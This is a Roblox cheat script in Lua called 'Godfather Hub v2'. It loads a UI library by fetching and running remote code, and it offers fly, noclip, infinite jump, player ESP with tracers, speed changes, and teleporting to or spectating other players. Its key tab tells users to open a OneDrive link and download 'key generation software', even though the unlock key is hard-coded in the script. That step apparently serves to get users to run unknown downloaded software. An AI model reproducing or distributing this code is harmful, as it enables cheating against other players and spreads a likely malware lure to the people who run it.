-- =================================================================
-- GODFATHER HUB v2 & PHANTOM AUTH SYSTEM (COMBINED)
-- =================================================================

local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- State Variables
local isKeyUnlocked = false
local flyEnabled = false
local noclipEnabled = false
local infiniteJumpEnabled = false
local espEnabled = false
local flySpeed = 50

local flyConnection = nil
local noclipConnection = nil
local jumpConnection = nil
local espConnection = nil
local cameraZoomConnection = nil
local bodyVelocity = nil
local bodyGyro = nil

local targetPlayers = {}
local currentTargetIndex = 0
local selectedPlayerName = nil
local spectating = false
local spectatedPlayer = nil
local espObjects = {}

local LINK = "https://1drv.ms/f/c/483e7ba0d40a851b/IgCdkSgtayc4TaLMU-eF9HmPAarKTAf6cAF0GXtXK2kpNpI?e=IAkqZG"

-- Utility Clipboard
local function copyToClipboard(text)
	if setclipboard then setclipboard(text) return true end
	if toclipboard then toclipboard(text) return true end
	if syn and syn.write_clipboard then syn.write_clipboard(text) return true end
	if clipboard and clipboard.set then clipboard.set(text) return true end
	return false
end

-- =================================================================
-- MEMUAT UI LIBRARY GODFATHER HUB
-- =================================================================
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GodFatherHub/UI-Library/main/source.lua"))()

local Window = Library:CreateWindow({
	Name = "GODFATHER HUB v2 // PHANTOM SYSTEM",
	LoadingTitle = "Phantom Defense System",
	LoadingSubtitle = "Clearance Level 5 Required",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "GodFatherHubFolder",
		FileName = "HubSettings"
	}
})

-- =================================================================
-- TAB 1: AUTHENTICATION & BRIEFING
-- =================================================================
local AuthTab = Window:CreateTab("Authentication", 4483362458)

AuthTab:CreateSection("🛡 PHANTOM DEFENSE SYSTEM")

local inputKey = ""
AuthTab:CreateInput({
	Name = "Authorization Key",
	PlaceholderText = "Enter Access Key...",
	RemoveTextAfterFocusLost = false,
	Callback = function(Text)
		inputKey = Text
	end,
})

AuthTab:CreateButton({
	Name = "▶ AUTHENTICATE",
	Callback = function()
		if inputKey == "OpFather211" then
			isKeyUnlocked = true
			Library:Notify({
				Title = "Access Granted",
				Content = "Menu unlocked successfully!",
				Duration = 3,
				Image = 4483362458,
			})
		else
			Library:Notify({
				Title = "Access Denied",
				Content = "ACCESS DENIED — INVALID KEY",
				Duration = 3,
				Image = 4483362458,
			})
		end
	end,
})

AuthTab:CreateSection("📡 KEY ACQUISITION BRIEFING")

AuthTab:CreateLabel("Step 1: Click 'COPY LINK' below")
AuthTab:CreateLabel("Step 2: Open a web browser on your device")
AuthTab:CreateLabel("Step 3: Paste link into address bar & Execute")
AuthTab:CreateLabel("Step 4: Download software for key generation")
AuthTab:CreateLabel("Step 5: Extract generated key from software")
AuthTab:CreateLabel("Step 6: Submit Key above")

AuthTab:CreateButton({
	Name = "📋 COPY LINK",
	Callback = function()
		local ok = copyToClipboard(LINK)
		if ok then
			Library:Notify({
				Title = "Success",
				Content = "Link copied to clipboard!",
				Duration = 3,
				Image = 4483362458,
			})
		else
			Library:Notify({
				Title = "Error",
				Content = "Failed to copy link.",
				Duration = 3,
				Image = 4483362458,
			})
		end
	end,
})

-- =================================================================
-- LOGIKA FITUR HUB (Fly, Noclip, ESP, Camera, Spectate, dll)
-- =================================================================

-- Camera Zoom Unlimited
local function enableCameraNoLimit()
	player.CameraMaxZoomDistance = 100000
	player.CameraMinZoomDistance = 0.5
	if cameraZoomConnection then cameraZoomConnection:Disconnect() cameraZoomConnection = nil end
	cameraZoomConnection = RunService.RenderStepped:Connect(function()
		if not isKeyUnlocked then return end
		if player.CameraMaxZoomDistance ~= 100000 then player.CameraMaxZoomDistance = 100000 end
		if player.CameraMinZoomDistance ~= 0.5 then player.CameraMinZoomDistance = 0.5 end
	end)
end

-- Fly
local function startFly()
	bodyVelocity = Instance.new("BodyVelocity")
	bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	bodyVelocity.Velocity = Vector3.new(0, 0, 0)
	bodyVelocity.Parent = humanoidRootPart

	bodyGyro = Instance.new("BodyGyro")
	bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
	bodyGyro.P = 10000
	bodyGyro.CFrame = humanoidRootPart.CFrame
	bodyGyro.Parent = humanoidRootPart

	flyConnection = RunService.RenderStepped:Connect(function()
		local camera = workspace.CurrentCamera
		local camCFrame = camera.CFrame
		local humanoidMoveDir = humanoid.MoveDirection

		local moveDirection = Vector3.new(0, 0, 0)
		if humanoidMoveDir.Magnitude > 0 then
			moveDirection = camCFrame.LookVector * humanoidMoveDir:Dot(camCFrame.LookVector)
				+ camCFrame.RightVector * humanoidMoveDir:Dot(camCFrame.RightVector)
		end

		if moveDirection.Magnitude > 0 then
			bodyVelocity.Velocity = moveDirection.Unit * flySpeed
		else
			bodyVelocity.Velocity = Vector3.new(0, 0, 0)
		end
		bodyGyro.CFrame = camCFrame
	end)
end

local function stopFly()
	if flyConnection then flyConnection:Disconnect() flyConnection = nil end
	if bodyVelocity then bodyVelocity:Destroy() bodyVelocity = nil end
	if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
end

-- Noclip
local function startNoclip()
	noclipConnection = RunService.Stepped:Connect(function()
		if character then
			for _, part in ipairs(character:GetDescendants()) do
				if part:IsA("BasePart") and part.CanCollide then
					part.CanCollide = false
				end
			end
		end
	end)
end

local function stopNoclip()
	if noclipConnection then noclipConnection:Disconnect() noclipConnection = nil end
	if character then
		for _, part in ipairs(character:GetDescendants()) do
			if part:IsA("BasePart") then part.CanCollide = true end
		end
	end
end

-- Infinite Jump
local function startInfiniteJump()
	jumpConnection = UserInputService.JumpRequest:Connect(function()
		if infiniteJumpEnabled and humanoid and isKeyUnlocked then
			humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
	end)
end

-- ESP System
local function clearESP()
	for plr, data in pairs(espObjects) do
		if data then
			if data.Highlight then data.Highlight:Destroy() end
			if data.Billboard then data.Billboard:Destroy() end
			if data.Tracer then data.Tracer:Remove() end
		end
		espObjects[plr] = nil
	end
end

local function createESP(plr)
	if plr == player or espObjects[plr] then return end
	local char = plr.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not root or not hum then return end

	local highlight = Instance.new("Highlight")
	highlight.Name = "RainbowESP"
	highlight.Adornee = char
	highlight.FillTransparency = 0.5
	highlight.OutlineTransparency = 0
	highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	highlight.Parent = char

	local billboard = Instance.new("BillboardGui")
	billboard.Name = "PlayerESP"
	billboard.Adornee = root
	billboard.Size = UDim2.new(0, 150, 0, 60)
	billboard.StudsOffset = Vector3.new(0, 3.5, 0)
	billboard.AlwaysOnTop = true
	billboard.ResetOnSpawn = false
	billboard.Parent = player:WaitForChild("PlayerGui")

	local nameLabel = Instance.new("TextLabel")
	nameLabel.Size = UDim2.new(1, 0, 0, 18)
	nameLabel.BackgroundTransparency = 1
	nameLabel.Text = plr.DisplayName
	nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	nameLabel.TextStrokeTransparency = 0.2
	nameLabel.Font = Enum.Font.GothamBold
	nameLabel.TextSize = 12
	nameLabel.Parent = billboard

	local distanceLabel = Instance.new("TextLabel")
	distanceLabel.Name = "Distance"
	distanceLabel.Size = UDim2.new(1, 0, 0, 16)
	distanceLabel.Position = UDim2.new(0, 0, 0, 18)
	distanceLabel.BackgroundTransparency = 1
	distanceLabel.Text = "0 studs"
	distanceLabel.TextColor3 = Color3.fromRGB(200, 200, 210)
	distanceLabel.TextStrokeTransparency = 0.3
	distanceLabel.Font = Enum.Font.Gotham
	distanceLabel.TextSize = 11
	distanceLabel.Parent = billboard

	local hpLabel = Instance.new("TextLabel")
	hpLabel.Name = "HP"
	hpLabel.Size = UDim2.new(1, 0, 0, 16)
	hpLabel.Position = UDim2.new(0, 0, 0, 34)
	hpLabel.BackgroundTransparency = 1
	hpLabel.Text = "HP: 100"
	hpLabel.TextColor3 = Color3.fromRGB(0, 230, 140)
	hpLabel.TextStrokeTransparency = 0.3
	hpLabel.Font = Enum.Font.GothamBold
	hpLabel.TextSize = 11
	hpLabel.Parent = billboard

	local tracer = Drawing.new("Line")
	tracer.Visible = false
	tracer.Thickness = 2
	tracer.Transparency = 1

	espObjects[plr] = { Highlight = highlight, Billboard = billboard, Tracer = tracer }
end

local function removeESP(plr)
	if espObjects[plr] then
		local data = espObjects[plr]
		if data.Highlight then data.Highlight:Destroy() end
		if data.Billboard then data.Billboard:Destroy() end
		if data.Tracer then data.Tracer:Remove() end
		espObjects[plr] = nil
	end
end

local function updateESP()
	if not espEnabled then return end
	local camera = workspace.CurrentCamera
	local myRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
	if not myRoot then return end

	local myRootScreenPos, myRootOnScreen = camera:WorldToViewportPoint(myRoot.Position)
	local rainbowColor = Color3.fromHSV((tick() % 3) / 3, 1, 1)

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= player then
			local char = plr.Character
			local root = char and char:FindFirstChild("HumanoidRootPart")
			local hum = char and char:FindFirstChildOfClass("Humanoid")

			if root and hum and hum.Health > 0 then
				createESP(plr)
				local data = espObjects[plr]
				if data then
					if data.Highlight then
						data.Highlight.FillColor = rainbowColor
						data.Highlight.OutlineColor = rainbowColor
					end

					local dist = (myRoot.Position - root.Position).Magnitude
					local distanceLabel = data.Billboard and data.Billboard:FindFirstChild("Distance")
					local hpLabel = data.Billboard and data.Billboard:FindFirstChild("HP")

					if distanceLabel then distanceLabel.Text = math.floor(dist) .. " studs" end
					if hpLabel then
						hpLabel.Text = "HP: " .. math.floor(hum.Health)
						if hum.Health > 50 then hpLabel.TextColor3 = Color3.fromRGB(0, 230, 140)
						elseif hum.Health > 25 then hpLabel.TextColor3 = Color3.fromRGB(255, 180, 50)
						else hpLabel.TextColor3 = Color3.fromRGB(255, 80, 80) end
					end

					local targetScreenPos, targetOnScreen = camera:WorldToViewportPoint(root.Position)
					if data.Tracer then
						if myRootOnScreen and targetOnScreen then
							data.Tracer.From = Vector2.new(myRootScreenPos.X, myRootScreenPos.Y)
							data.Tracer.To = Vector2.new(targetScreenPos.X, targetScreenPos.Y)
							data.Tracer.Color = rainbowColor
							data.Tracer.Visible = true
						else
							data.Tracer.Visible = false
						end
					end
				end
			else
				removeESP(plr)
			end
		end
	end
end

local function startESP()
	if espConnection then espConnection:Disconnect() end
	updateESP()
	espConnection = RunService.RenderStepped:Connect(updateESP)
end

local function stopESP()
	if espConnection then espConnection:Disconnect() espConnection = nil end
	clearESP()
end

Players.PlayerAdded:Connect(function(plr)
	if espEnabled then plr.CharacterAdded:Connect(function() task.wait(0.5) if espEnabled then createESP(plr) end end) end
end)
Players.PlayerRemoving:Connect(removeESP)

-- Spectate System
local function stopSpectate()
	if not spectating then return end
	local camera = workspace.CurrentCamera
	spectating = false
	spectatedPlayer = nil
	if humanoid then
		camera.CameraType = Enum.CameraType.Custom
		camera.CameraSubject = humanoid
	end
end

local function startSpectate(targetPlayer)
	if not targetPlayer or targetPlayer == player then return end
	local targetCharacter = targetPlayer.Character
	if not targetCharacter then return end
	local targetHumanoid = targetCharacter:FindFirstChildOfClass("Humanoid")
	if not targetHumanoid then return end

	local camera = workspace.CurrentCamera
	if spectating then stopSpectate() end

	spectating = true
	spectatedPlayer = targetPlayer
	camera.CameraType = Enum.CameraType.Custom
	camera.CameraSubject = targetHumanoid
end

-- =================================================================
-- TAB 2: CHEAT FEATURES (Hanya berfungsi setelah Key diisi)
-- =================================================================
local MainTab = Window:CreateTab("Main Controls", 4483362458)

MainTab:CreateSection("⚡ PLAYER MOVEMENT & VISUALS")

MainTab:CreateToggle({
	Name = "Fly Control",
	CurrentValue = false,
	Callback = function(Value)
		if not isKeyUnlocked then 
			Library:Notify({ Title = "Locked", Content = "Please authenticate first!", Duration = 3 })
			return 
		end
		flyEnabled = Value
		if flyEnabled then startFly() else stopFly() end
	end,
})

MainTab:CreateSlider({
	Name = "Fly Speed",
	Range = {10, 300},
	Increment = 10,
	Suffix = "Speed",
	CurrentValue = 50,
	Callback = function(Value)
		flySpeed = Value
	end,
})

MainTab:CreateToggle({
	Name = "Noclip Passthrough",
	CurrentValue = false,
	Callback = function(Value)
		if not isKeyUnlocked then 
			Library:Notify({ Title = "Locked", Content = "Please authenticate first!", Duration = 3 })
			return 
		end
		noclipEnabled = Value
		if noclipEnabled then startNoclip() else stopNoclip() end
	end,
})

MainTab:CreateToggle({
	Name = "Infinite Jump",
	CurrentValue = false,
	Callback = function(Value)
		if not isKeyUnlocked then 
			Library:Notify({ Title = "Locked", Content = "Please authenticate first!", Duration = 3 })
			return 
		end
		infiniteJumpEnabled = Value
		if infiniteJumpEnabled and not jumpConnection then startInfiniteJump() end
	end,
})

MainTab:CreateToggle({
	Name = "ESP Visuals",
	CurrentValue = false,
	Callback = function(Value)
		if not isKeyUnlocked then 
			Library:Notify({ Title = "Locked", Content = "Please authenticate first!", Duration = 3 })
			return 
		end
		espEnabled = Value
		if espEnabled then startESP() else stopESP() end
	end,
})

MainTab:CreateInput({
	Name = "Set WalkSpeed",
	PlaceholderText = "Default: 16",
	RemoveTextAfterFocusLost = false,
	Callback = function(Text)
		if not isKeyUnlocked then return end
		local val = tonumber(Text)
		if val and humanoid then
			humanoid.WalkSpeed = val
		end
	end,
})

MainTab:CreateSection("🎯 TELEPORT & SPECTATE")

MainTab:CreateButton({
	Name = "Select Next Player Target",
	Callback = function()
		if not isKeyUnlocked then return end
		targetPlayers = {}
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr ~= player then table.insert(targetPlayers, plr) end
		end
		
		if #targetPlayers == 0 then
			Library:Notify({ Title = "Target Error", Content = "No other players found", Duration = 2 })
			return
		end

		currentTargetIndex = currentTargetIndex + 1
		if currentTargetIndex > #targetPlayers then currentTargetIndex = 1 end
		local target = targetPlayers[currentTargetIndex]
		selectedPlayerName = target.Name
		
		Library:Notify({ Title = "Target Selected", Content = target.DisplayName, Duration = 2 })
	end,
})

MainTab:CreateButton({
	Name = "Teleport To Selected Player",
	Callback = function()
		if not isKeyUnlocked or not selectedPlayerName then 
			Library:Notify({ Title = "Error", Content = "Select a target first!", Duration = 2 })
			return 
		end
		local targetPlayer = Players:FindFirstChild(selectedPlayerName)
		if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
			humanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
			Library:Notify({ Title = "Teleported", Content = "Teleported to " .. targetPlayer.DisplayName, Duration = 2 })
		end
	end,
})

MainTab:CreateButton({
	Name = "Toggle Spectate Selected Player",
	Callback = function()
		if not isKeyUnlocked or not selectedPlayerName then 
			Library:Notify({ Title = "Error", Content = "Select a target first!", Duration = 2 })
			return 
		end
		if spectating then
			stopSpectate()
			Library:Notify({ Title = "Spectate", Content = "Stopped Spectating", Duration = 2 })
		else
			local targetPlayer = Players:FindFirstChild(selectedPlayerName)
			if targetPlayer then
				startSpectate(targetPlayer)
				Library:Notify({ Title = "Spectate", Content = "Spectating " .. targetPlayer.DisplayName, Duration = 2 })
			end
		end
	end,
})

-- Handle Respawn Character
player.CharacterAdded:Connect(function(char)
	character = char
	humanoid = char:WaitForChild("Humanoid")
	humanoidRootPart = char:WaitForChild("HumanoidRootPart")

	if isKeyUnlocked then enableCameraNoLimit() end
	if flyEnabled and isKeyUnlocked then stopFly() startFly() end
end)
